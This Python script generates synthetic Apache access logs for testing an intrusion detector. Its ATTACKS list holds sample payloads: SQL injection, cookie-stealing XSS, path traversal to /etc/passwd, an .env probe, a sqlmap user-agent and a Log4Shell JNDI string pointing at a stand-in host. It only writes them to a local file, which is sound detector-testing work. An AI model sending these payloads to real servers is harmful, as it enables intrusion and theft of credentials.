#!/usr/bin/env python3
"""
Generates synthetic Apache "combined" log traffic so you can try the whole
pipeline without a real web server.

  # 1) a file of NORMAL traffic to train the detector on
  python demo_traffic.py normal normal.log --count 6000

  # 2) live traffic (mostly normal, some attacks) for the C# backend to tail
  python demo_traffic.py live demo_access.log --rate 5 --attack-ratio 0.05

Standard library only. The attacks are the kinds a public server sees daily.
"""

import argparse
import random
import time
from datetime import datetime, timezone

PAGES = [
    "/", "/index.html", "/about", "/contact", "/products", "/products/view",
    "/blog", "/blog/post", "/cart", "/login", "/search", "/api/v1/items",
    "/static/app.js", "/static/style.css", "/images/logo.png",
]

QUERIES = [
    lambda r: "",
    lambda r: f"?id={r.randint(1, 900)}",
    lambda r: f"?page={r.randint(1, 30)}&sort=name",
    lambda r: f"?q={r.choice(['wine', 'cheese', 'bread', 'olive+oil'])}",
    lambda r: f"?id={r.randint(1, 900)}&ref=home",
]

AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

BROWSER = AGENTS[0]

ATTACKS = [
    ("sql injection", "GET", "/products?id=1'+UNION+SELECT+username,password+FROM+users--", BROWSER),
    ("sql injection", "GET", "/products?id=1'+OR+'1'='1", BROWSER),
    ("xss", "GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", BROWSER),
    ("xss with a raw quote (logged as \\\")", "GET", '/search?q=\\"><script>alert(1)</script>', BROWSER),
    ("path traversal", "GET", "/static/..%2f..%2f..%2fetc/passwd", BROWSER),
    ("hidden file probe", "GET", "/.env", BROWSER),
    ("scanner user-agent", "GET", "/products?id=5", "sqlmap/1.7.2#stable (https://sqlmap.org)"),
    ("log4shell in user-agent", "GET", "/", "${jndi:ldap://203.0.113.9/a}"),
    ("oversized value (model-only)", "GET", "/search?q=" + "A" * 700, BROWSER),
]


def line(rng, method, url, agent, ip=None):
    ip = ip or f"{rng.choice([10, 172, 192, 203])}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
    stamp = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    status = rng.choice([200, 200, 200, 200, 304])
    return (f'{ip} - - [{stamp}] "{method} {url} HTTP/1.1" '
            f'{status} {rng.randint(300, 9000)} "-" "{agent}"')


def normal_line(rng):
    page = rng.choice(PAGES)
    query = rng.choice(QUERIES)(rng) if page not in ("/static/app.js", "/static/style.css", "/images/logo.png") else ""
    method = "POST" if page in ("/cart", "/login") else "GET"
    return line(rng, method, page + query, rng.choice(AGENTS))


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("mode", choices=["normal", "live"])
    parser.add_argument("path")
    parser.add_argument("--count", type=int, default=6000, help="normal mode: number of lines")
    parser.add_argument("--rate", type=float, default=5, help="live mode: lines per second")
    parser.add_argument("--attack-ratio", type=float, default=0.05, help="live mode: share of attack lines")
    parser.add_argument("--seed", type=int, default=None)
    args = parser.parse_args()
    rng = random.Random(args.seed)

    if args.mode == "normal":
        with open(args.path, "w", encoding="utf-8") as file:
            for _ in range(args.count):
                file.write(normal_line(rng) + "\n")
        print(f"wrote {args.count} normal lines to {args.path}")
        return

    print(f"appending to {args.path} at ~{args.rate}/s, {args.attack_ratio:.0%} attacks (Ctrl+C to stop)")
    with open(args.path, "a", encoding="utf-8") as file:
        try:
            while True:
                if rng.random() < args.attack_ratio:
                    name, method, url, agent = rng.choice(ATTACKS)
                    file.write(line(rng, method, url, agent, ip="198.51.100.23") + "\n")
                    print(f"  attack: {name}")
                else:
                    file.write(normal_line(rng) + "\n")
                file.flush()
                time.sleep(1.0 / args.rate)
        except KeyboardInterrupt:
            print("stopped")


if __name__ == "__main__":
    main()
